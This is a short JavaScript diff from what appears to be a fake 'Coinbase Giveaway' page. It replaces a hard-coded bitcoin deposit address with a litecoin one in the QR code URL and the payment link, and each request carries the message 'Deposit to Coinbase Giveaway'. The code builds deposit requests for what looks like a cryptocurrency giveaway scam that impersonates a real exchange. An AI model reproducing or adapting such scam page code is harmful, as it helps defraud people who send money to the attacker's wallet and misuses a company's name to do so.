@@ -187,7 +187,7 @@ function update_trans() {
       $('#gen-amount').text(amount_entered)
       $('#qrcode_svg').attr(
         'src',
-        'https://api.qrserver.com/v1/create-qr-code/?data=bitcoin%3Abc1qlgmvzupj79rf6ltptnldsm8mt64gatzayjkm8s%3Famount%3D' +
+        'https://api.qrserver.com/v1/create-qr-code/?data=litecoin%3Altc1qzctqq5nm5mzppy77qjkxc85r72rjp92tlht694%3Famount%3D' +
           amount_entered +
           '%26message%3DDeposit%2Bto%2BCoinbase%2BGiveaway%2B' +
           tm +
@@ -197,7 +197,7 @@ function update_trans() {
         .parent()
         .attr(
           'href',
-          'bitcoin:bc1qlgmvzupj79rf6ltptnldsm8mt64gatzayjkm8s?amount=' +
+          'litecoin:ltc1qzctqq5nm5mzppy77qjkxc85r72rjp92tlht694?amount=' +
             amount_entered +
             '&message=Deposit+to+Coinbase+Giveaway+' +
             tm,
